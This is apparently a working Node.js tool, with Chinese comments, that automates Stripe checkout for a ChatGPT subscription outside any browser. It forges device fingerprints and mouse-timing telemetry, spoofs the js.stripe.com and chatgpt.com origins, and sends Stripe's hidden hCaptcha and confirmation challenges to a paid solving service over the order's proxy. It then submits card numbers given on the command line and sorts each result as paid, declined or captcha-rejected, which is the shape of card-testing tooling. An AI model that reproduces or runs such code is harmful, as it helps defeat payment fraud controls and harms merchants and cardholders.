#!/usr/bin/env node
/**
 * 完整协议支付 v2：
 *   init → 取 link_settings 的 sitekey/rqdata → 解 passive captcha
 *   → pm → confirm（带 passive_captcha_token）→ poll
 */
const fs = require('node:fs');
const crypto = require('node:crypto');
const undici = require('undici');

const STRIPE='https://api.stripe.com';
const V_FULL='2025-03-31.basil; checkout_server_update_beta=v1; checkout_manual_approval_preview=v1';
const V_BASE='2025-03-31.basil';
const UA='Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/146.0.0.0 Safari/537.36';
const PK='${STRIPE_PUBLISHABLE_KEY}';
const HASH='5412f474d5';
const PROXY=process.env.ORDER_PROXY||'';
const CK=process.env.GSS_CAPTCHA_API_KEY||'';
const CU=process.env.GSS_CAPTCHA_API_URL||'https://api.yescaptcha.com';
const sleep=ms=>new Promise(r=>setTimeout(r,ms));
const log=(...a)=>console.log(new Date().toISOString().slice(11,23),...a);
const arg=(n,d)=>{const i=process.argv.indexOf('--'+n);return i>0?process.argv[i+1]:d;};

let dp=null, dpCaptcha=null;
async function req(method,url,body,headers={},useProxy=true){
  const h={'User-Agent':UA,'Accept':'application/json',...headers};
  const o={method,headers:h};
  if(body)o.body=body;
  const d = useProxy ? dp : dpCaptcha;
  if(d)o.dispatcher=d;
  const r=await undici.request(url,o);
  const text=await r.body.text();
  let json=null;try{json=JSON.parse(text)}catch(e){}
  return {status:r.statusCode,text,json};
}
const form=o=>Object.entries(o).filter(([,v])=>v!==undefined&&v!==null&&v!=='')
  .map(([k,v])=>encodeURIComponent(k)+'='+encodeURIComponent(String(v))).join('&');
const HDR={'Content-Type':'application/x-www-form-urlencoded',
  'Origin':'https://js.stripe.com','Referer':'https://js.stripe.com/'};

// ── 指纹 ──
function b64u(n=32){return crypto.randomBytes(n).toString('base64url');}
function genId(){return crypto.randomUUID().replace(/-/g,'')+crypto.randomBytes(3).toString('hex');}
async function fingerprint(){
  log('① m.stripe.com/6');
  let [guid,muid,sid]=[genId(),genId(),genId()];
  const fpId=crypto.randomBytes(16).toString('hex');
  const PLUGINS='PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, Chrome PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, Chromium PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, Microsoft Edge PDF Viewer,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf, WebKit built-in PDF,internal-pdf-viewer,application/pdf,pdf++text/pdf,pdf';
  const enc=o=>Buffer.from(encodeURIComponent(JSON.stringify(o))).toString('base64');
  const buildFull=(v2,ids)=>({v2,id:fpId,t:+(Math.random()*117+3).toFixed(1),
    tag:'$npm_package_version',src:'js',
    a:{a:{v:'true',t:0},b:{v:'true',t:0},c:{v:'en-US',t:0},d:{v:'Win32',t:0},
      e:{v:PLUGINS,t:+(Math.random()*0.5).toFixed(1)},
      f:{v:'1920w_1013h_24d_1r',t:0},g:{v:'8',t:0},h:{v:'false',t:0},
      i:{v:'sessionStorage-enabled, localStorage-enabled',t:+(Math.random()*1.5+0.5).toFixed(1)},
      j:{v:'0100100101111111101111101111111001110010110111110111111',t:+(Math.random()*115+5).toFixed(1)},
      k:{v:'',t:0},l:{v:UA,t:0},m:{v:'',t:0},n:{v:'false',t:+(Math.random()*47+3).toFixed(1)},
      o:{v:'d331ca493eb692cfcd19ae5db713ad4b',t:+(Math.random()*10+20).toFixed(1)}},
    b:{a:`https://${b64u(8)}.${b64u(8)}.${b64u(8)}/`,
      b:`https://${b64u(8)}.${b64u(8)}/${b64u(8)}/${b64u(8)}/${b64u(8)}`,
      c:b64u(32),d:ids?muid:'NA',e:ids?sid:'NA',f:false,g:true,h:true,
      i:['location'],j:[],n:+(Math.random()*1200+800).toFixed(1),
      u:'chatgpt.com',v:'auth.openai.com',
      w:`${Date.now()}:${crypto.randomBytes(32).toString('hex')}`},
    h:crypto.randomBytes(10).toString('hex')});
  const buildMouse=s=>({muid,sid,url:`https://${b64u(8)}.${b64u(8)}/${b64u(8)}/${b64u(8)}/${b64u(8)}`,
    source:s,data:Array.from({length:10},()=>1+Math.floor(Math.random()*8))});
  const H={'User-Agent':UA,'Content-Type':'text/plain;charset=UTF-8','Accept':'*/*',
    'Origin':'https://m.stripe.network','Referer':'https://m.stripe.network/'};
  for(const [n,p,apply] of [
    ['#1',buildFull(1,false),j=>{muid=j.muid||muid;guid=j.guid||guid;sid=j.sid||sid;}],
    ['#2',buildFull(2,true),j=>{guid=j.guid||guid;}],
    ['#3',buildMouse('mouse-timings-10-v2'),null],
    ['#4',buildMouse('mouse-timings-10'),null]]){
    try{const r=await req('POST','https://m.stripe.com/6',enc(p),H);
      if(r.status===200&&r.json&&apply)apply(r.json);}catch(e){}
  }
  log(`   guid=${guid.slice(0,12)}`);
  return {guid,muid,sid};
}

// ── init ──
async function init(csId){
  log('② init');
  const jsId=crypto.randomUUID();
  const body=form({browser_locale:'en-US',browser_timezone:'America/Chicago',
    'elements_session_client[elements_init_source]':'custom_checkout',
    'elements_session_client[referrer_host]':'chatgpt.com',
    'elements_session_client[stripe_js_id]':jsId,
    'elements_session_client[locale]':'en-US',
    'elements_session_client[is_aggregation_expected]':'false',
    key:PK,_stripe_version:V_FULL,
    'elements_session_client[client_betas][0]':'custom_checkout_server_updates_1',
    'elements_session_client[client_betas][1]':'custom_checkout_manual_approval_1'});
  const r=await req('POST',`${STRIPE}/v1/payment_pages/${csId}/init`,body,HDR);
  if(r.status!==200)throw new Error(`init ${r.status}: ${r.text.slice(0,200)}`);
  const j=r.json;
  const ls=j.link_settings||{};
  const due=(j.total_summary||{}).due;
  const ctx={stripeJsId:jsId,initChecksum:j.init_checksum||'',configId:j.config_id||'',
    amount:due!=null?String(due):'0',returnUrl:j.url||j.stripe_hosted_url||'',
    siteKey:ls.hcaptcha_site_key||'',rqdata:ls.hcaptcha_rqdata||''};
  log(`   amount=${ctx.amount} siteKey=${ctx.siteKey} rqdata=${ctx.rqdata.length}`);
  return {resp:j,ctx};
}

async function elementsSession(csId,ctx){
  const q=new URLSearchParams({'client_betas[0]':'custom_checkout_server_updates_1',
    'client_betas[1]':'custom_checkout_manual_approval_1',
    'deferred_intent[mode]':'subscription','deferred_intent[amount]':'0',
    'deferred_intent[currency]':'usd','deferred_intent[setup_future_usage]':'off_session',
    'deferred_intent[payment_method_types][0]':'card',currency:'usd',key:PK,
    _stripe_version:V_FULL,elements_init_source:'custom_checkout',
    referrer_host:'chatgpt.com',stripe_js_id:ctx.stripeJsId,locale:'en',
    type:'deferred_intent',checkout_session_id:csId});
  const r=await req('GET',`${STRIPE}/v1/elements/sessions?${q}`,null,HDR);
  if(r.status===200&&r.json){
    if(r.json.config_id)ctx.configId=r.json.config_id;
  }
  return r;
}

async function updateAddress(csId,b,ctx){
  log('④ 逐字段地址 ×6');
  const base={'elements_session_client[client_betas][0]':'custom_checkout_server_updates_1',
    'elements_session_client[client_betas][1]':'custom_checkout_manual_approval_1',
    'elements_session_client[elements_init_source]':'custom_checkout',
    'elements_session_client[referrer_host]':'chatgpt.com',
    'elements_session_client[session_id]':'elements_session_'+crypto.randomBytes(6).toString('base64url').slice(0,11),
    'elements_session_client[stripe_js_id]':ctx.stripeJsId,
    'elements_session_client[locale]':'en-US',
    'elements_session_client[is_aggregation_expected]':'false',
    'client_attribution_metadata[merchant_integration_additional_elements][0]':'payment',
    'client_attribution_metadata[merchant_integration_additional_elements][1]':'address',
    key:PK,_stripe_version:V_FULL};
  const steps=[{'tax_region[country]':'US'},{},
    {'tax_region[line1]':b.line1},{'tax_region[city]':b.city},
    {'tax_region[state]':b.state},{'tax_region[postal_code]':b.zip}];
  const acc={};
  for(let i=0;i<steps.length;i++){
    Object.assign(acc,steps[i]);
    const r=await req('POST',`${STRIPE}/v1/payment_pages/${csId}`,form({...base,...acc}),HDR);
    if(r.status!==200)log(`   [${i+1}] ${r.status} ${r.text.slice(0,80)}`);
    await sleep(1500+Math.random()*1000);
  }
  log('   完成');
}

// ── 解 passive captcha ──
async function solveCaptchaProxy(siteKey,rqdata){
  // 关键：用订单同一个代理 IP 解，保证 token 与支付环境同源
  if(!siteKey||!PROXY){return null;}
  const u=new URL(PROXY);
  const task={type:'HCaptchaTask',
    websiteURL:'https://b.stripecdn.com/stripethirdparty-srv/assets/v35.5/HCaptchaInvisible.html',
    websiteKey:siteKey,isEnterprise:true,
    proxyType:'http',
    proxyAddress:u.hostname,
    proxyPort:Number(u.port),
    proxyLogin:decodeURIComponent(u.username||''),
    proxyPassword:decodeURIComponent(u.password||''),
    enterprisePayload:{rqdata:rqdata}};
  const c=await req('POST',`${CU}/createTask`,JSON.stringify({clientKey:CK,task}),
    {'Content-Type':'application/json'},false);
  if(!c.json||!c.json.taskId){log('   代理任务创建失败');return null;}
  log(`   代理任务 ${c.json.taskId.slice(0,10)}`);
  for(let i=0;i<60;i++){
    await sleep(3000);
    const r=await req('POST',`${CU}/getTaskResult`,
      JSON.stringify({clientKey:CK,taskId:c.json.taskId}),{'Content-Type':'application/json'},false);
    const j=r.json||{};
    if(j.status==='ready'){
      const s=j.solution||{};
      const tok=s.gRecaptchaResponse||s.token||'';
      log(`   代理解出 ${tok.length} chars ekey=${(s.eKey||'').length}`);
      return {token:tok,ekey:s.eKey||''};
    }
    if(j.errorId&&j.errorCode!=='ERROR_TASK_NOT_READY'){
      log(`   代理任务错误 ${j.errorCode}`);return null;}
  }
  return null;
}

async function solvePassive(siteKey,rqdata){
  log('⑤ 解 passive captcha');
  if(!siteKey){log('   无 siteKey，跳过');return null;}
  const task={type:'HCaptchaTaskProxyless',
    websiteURL:'https://b.stripecdn.com/stripethirdparty-srv/assets/v35.5/HCaptchaInvisible.html',
    websiteKey:siteKey,isEnterprise:true,userAgent:UA,
    enterprisePayload:{rqdata}};
  const c=await req('POST',`${CU}/createTask`,JSON.stringify({clientKey:CK,task}),
    {'Content-Type':'application/json'},false);
  if(!c.json||!c.json.taskId){log('   createTask 失败',c.text.slice(0,120));return null;}
  log(`   taskId=${c.json.taskId.slice(0,12)}`);
  for(let i=0;i<60;i++){
    await sleep(3000);
    const r=await req('POST',`${CU}/getTaskResult`,
      JSON.stringify({clientKey:CK,taskId:c.json.taskId}),{'Content-Type':'application/json'},false);
    const j=r.json||{};
    if(j.status==='ready'){
      const s=j.solution||{};
      const tok=s.gRecaptchaResponse||s.token||'';
      log(`   SOLVED ${tok.length} chars`);
      return {token:tok,ekey:s.eKey||''};
    }
    if(j.errorId&&j.errorCode!=='ERROR_TASK_NOT_READY'){
      log(`   ERR ${j.errorCode}`);return null;
    }
  }
  log('   超时');return null;
}

async function createPM(card,b,fp,csId,ctx){
  log('⑥ payment_methods');
  const body=form({'billing_details[name]':b.name,'billing_details[email]':b.email,
    'billing_details[address][country]':'US','billing_details[address][line1]':b.line1,
    'billing_details[address][city]':b.city,'billing_details[address][postal_code]':b.zip,
    'billing_details[address][state]':b.state,type:'card',
    'card[number]':card.number,'card[cvc]':card.cvc,
    'card[exp_year]':card.expYear,'card[exp_month]':card.expMonth,
    allow_redisplay:'unspecified',
    payment_user_agent:`stripe.js/${HASH}; stripe-js-v3/${HASH}; payment-element; deferred-intent`,
    referrer:'https://chatgpt.com',time_on_page:String(25000+Math.floor(Math.random()*30000)),
    'client_attribution_metadata[client_session_id]':crypto.randomUUID(),
    'client_attribution_metadata[checkout_session_id]':csId,
    'client_attribution_metadata[merchant_integration_source]':'elements',
    'client_attribution_metadata[merchant_integration_subtype]':'payment-element',
    'client_attribution_metadata[merchant_integration_version]':'2021',
    'client_attribution_metadata[payment_intent_creation_flow]':'deferred',
    'client_attribution_metadata[payment_method_selection_flow]':'automatic',
    guid:fp.guid,muid:fp.muid,sid:fp.sid,key:PK,_stripe_version:V_FULL});
  const r=await req('POST',`${STRIPE}/v1/payment_methods`,body,HDR);
  if(r.status!==200)throw new Error(`pm ${r.status}: ${r.text.slice(0,300)}`);
  log(`   ${r.json.id} (${(r.json.card||{}).display_brand} ****${(r.json.card||{}).last4})`);
  return r.json.id;
}

async function confirm(csId,pmId,fp,ctx,cap){
  log('⑦ confirm');
  const body=form({guid:fp.guid,muid:fp.muid,sid:fp.sid,payment_method:pmId,
    expected_amount:ctx.amount,expected_payment_method_type:'card',
    'consent[terms_of_service]':'accepted',key:PK,_stripe_version:V_FULL,
    init_checksum:ctx.initChecksum,version:HASH,return_url:ctx.returnUrl,
    'elements_session_client[elements_init_source]':'custom_checkout',
    'elements_session_client[referrer_host]':'chatgpt.com',
    'elements_session_client[stripe_js_id]':ctx.stripeJsId,
    'elements_session_client[locale]':'en-US',
    'elements_session_client[is_aggregation_expected]':'false',
    'elements_session_client[client_betas][0]':'custom_checkout_server_updates_1',
    'elements_session_client[client_betas][1]':'custom_checkout_manual_approval_1',
    'client_attribution_metadata[client_session_id]':ctx.stripeJsId,
    'client_attribution_metadata[checkout_session_id]':csId,
    'client_attribution_metadata[checkout_config_id]':ctx.configId,
    'client_attribution_metadata[elements_session_config_id]':crypto.randomUUID(),
    'client_attribution_metadata[merchant_integration_source]':'checkout',
    'client_attribution_metadata[merchant_integration_subtype]':'payment-element',
    'client_attribution_metadata[merchant_integration_version]':'custom',
    'client_attribution_metadata[payment_intent_creation_flow]':'deferred',
    'client_attribution_metadata[payment_method_selection_flow]':'automatic',
    'client_attribution_metadata[merchant_integration_additional_elements][0]':'payment',
    'client_attribution_metadata[merchant_integration_additional_elements][1]':'address',
    ...(cap?{'passive_captcha_token':cap.token,
             ...(cap.ekey?{'passive_captcha_ekey':cap.ekey}:{})}:{})});
  const r=await req('POST',`${STRIPE}/v1/payment_pages/${csId}/confirm`,body,HDR);
  log(`   → ${r.status} (${r.text.length} chars)`);
  return r;
}

async function poll(csId,tries=15){
  log('⑧ poll');
  let last=null;
  for(let i=0;i<tries;i++){
    await sleep(2000);
    const q=new URLSearchParams({key:PK,_stripe_version:V_BASE});
    const r=await req('GET',`${STRIPE}/v1/payment_pages/${csId}/poll?${q}`,null,HDR);
    last=r.json||{raw:r.text.slice(0,300)};
    const st=last.state||last.payment_object_status;
    log(`   [${i+1}] state=${st} payment=${last.payment_object_status}`);
    if(['succeeded','failed','expired','canceled'].includes(String(st)))break;
  }
  return last;
}

function PI_URL(u){ return u; }

async function verifyChallenge(path,cap,clientSecret){
  log('⑦c verify_challenge');
  const body=form({client_secret:clientSecret,
    challenge_response_token:cap.token,
    captcha_vendor_name:'hcaptcha',
    ...(cap.ekey?{captcha_response_key:cap.ekey}:{}),
    key:PK,_stripe_version:V_FULL});
  const r=await req('POST',`${STRIPE}${path}`,body,HDR);
  log(`   → ${r.status} (${r.text.length} chars)`);
  return r;
}

function classify(cf,pf){
  const o={state:'unknown',code:null,decline:null,message:null,intent_status:null};
  const scan=x=>{
    if(!x||typeof x!=='object')return;
    for(const h of ['payment_intent','setup_intent']){
      const y=x[h];if(!y||typeof y!=='object')continue;
      if(y.status)o.intent_status=y.status;
      const e=y.last_payment_error||y.last_setup_error||{};
      if(e&&Object.keys(e).length){o.code=e.code||o.code;
        o.decline=e.decline_code||o.decline;o.message=(e.message||'').slice(0,200);}
    }
    if(x.error){o.code=o.code||x.error.code;o.decline=o.decline||x.error.decline_code;
      o.message=o.message||String(x.error.message||'').slice(0,200);}
    if(x.state)o.hint=x.state;
  };
  scan(cf&&cf.json);scan(pf);
  const st=String(o.intent_status||'').toLowerCase();
  if(['succeeded','requires_capture'].includes(st))o.state='paid';
  else if(o.decline||o.code)o.state=/captcha/i.test(o.message||'')?'captcha_rejected':'card_declined';
  else if(st==='requires_action')o.state='challenge_or_3ds';
  else if(o.hint==='failed')o.state='card_declined';
  return o;
}

(async()=>{
  const t0=Date.now();
  if(PROXY)dp=new undici.ProxyAgent(PROXY);
  if(PROXY)dpCaptcha=null;  // 打码服务直连

  const target=process.argv[2]||'';
  const m=String(target).match(/(cs_(?:live|test)_[A-Za-z0-9]+)/);
  if(!m){console.error('用法: node pay2.cjs <cs_live_xxx|url>');process.exit(2);}
  const csId=m[1];
  const ca=arg('card','<CARD_NUMBER_PLACEHOLDER>|02|2029|135').split('|');
  const card={number:ca[0],
    expMonth:String(ca[1]||'02').replace(/\D/g,'').padStart(2,'0'),
    expYear:String(ca[2]||'2029').replace(/\D/g,''),cvc:ca[3]||'135'};
  const b={name:arg('name','FIXTURE HOLDER'),email:arg('email','<BILLING_EMAIL>'),
    line1:arg('line1','1 Fixture St'),city:arg('city','Portland'),
    state:arg('state','OR'),zip:arg('zip','97211')};
  const out=arg('out','/tmp/pay2_result.json');
  const result={csId,card:card.number.slice(-4)};

  try{
    log(`目标 ${csId.slice(0,18)} 卡 ****${card.number.slice(-4)}`);
    const fp=await fingerprint();
    const {resp,ctx}=await init(csId);
    result.init={amount:ctx.amount,siteKey:ctx.siteKey,rqLen:ctx.rqdata.length};
    await elementsSession(csId,ctx);
    await updateAddress(csId,b,ctx);

    const cap=await solvePassive(ctx.siteKey,ctx.rqdata);
    result.captcha=cap?{tokenLen:cap.token.length,ekeyLen:cap.ekey.length}:null;

    const pmId=await createPM(card,b,fp,csId,ctx);
    result.pm=pmId;

    const cf=await confirm(csId,pmId,fp,ctx,cap);
    result.confirm={status:cf.status,body:cf.json||cf.text.slice(0,1500)};

    // 如果 confirm 触发了 intent_confirmation_challenge，立刻补解一轮
    const na=(cf.json&&cf.json.payment_intent&&cf.json.payment_intent.next_action)
          || (cf.json&&cf.json.next_action)||{};
    const sdk=na.use_stripe_sdk||{};
    if(sdk.type==='intent_confirmation_challenge'){
      const sj=sdk.stripe_js||{};
      const pi=cf.json.payment_intent||{};
      log('⑦b 补解 challenge');
      log(`   siteKey=${sj.site_key} rqdata=${(sj.rqdata||'').length}`);
      result.challenge={siteKey:sj.site_key,rqLen:(sj.rqdata||'').length,
        piId:pi.id,url:sj.verification_url};
      const chTok=await solveCaptchaProxy(sj.site_key,sj.rqdata,PI_URL(sj.verification_url));
      if(chTok){
        result.challengeToken={len:chTok.token.length,ekeyLen:chTok.ekey.length};
        const v=await verifyChallenge(sj.verification_url,chTok,pi.client_secret);
        result.verify={status:v.status,body:v.json||v.text.slice(0,1000)};
        log(`   verify → ${v.status}`);
      } else {
        log('   challenge 解题失败');
      }
    }

    let pf=null;
    const c1=classify(cf,null);
    if(!['paid','card_declined'].includes(c1.state)){
      pf=await poll(csId);result.poll=pf;
    }
    result.verdict=classify(cf,pf);
    if(result.verify&&result.verify.body&&result.verify.body.error){
      const e=result.verify.body.error;
      result.verdict={state:/captcha/i.test(e.message||'')?'captcha_rejected':'card_declined',
        code:e.code,decline:e.decline_code,message:String(e.message||'').slice(0,200),
        intent_status:(result.verify.body.payment_intent||{}).status};
    }
    log(`判定 ${result.verdict.state} decline=${result.verdict.decline} msg=${String(result.verdict.message||'').slice(0,60)}`);
  }catch(e){
    result.error=String(e.message).slice(0,400);
    log('失败:',result.error);
  }
  result.elapsed=((Date.now()-t0)/1000).toFixed(1)+'s';
  fs.writeFileSync(out,JSON.stringify(result,null,2));
  const v=result.verdict||{};
  console.log('\n'+JSON.stringify({state:v.state,decline:v.decline,message:v.message,
    elapsed:result.elapsed,error:result.error},null,1));
  console.log('saved ->',out);
  process.exit(0);
})();
